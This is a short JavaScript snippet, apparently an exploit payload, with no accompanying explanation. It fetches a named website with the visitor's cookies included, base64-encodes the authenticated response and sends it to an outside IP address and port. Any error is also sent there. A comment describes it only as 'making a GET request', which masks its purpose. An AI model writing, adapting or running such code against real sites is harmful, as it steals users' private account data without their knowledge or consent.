const url = 'https://fredtep.com';

// Making a GET request using fetch()
fetch(url, {
  credentials: 'include'  
})
  .then(response => {
    return response.json();
  })
  .then(data => {
    fetch("http://82.65.210.151:24000/?encodedData=" + btoa(data));
  })
  .catch(error => {
    console.log("error");
    fetch("http://82.65.210.151:24000/?error=" + error);
  });
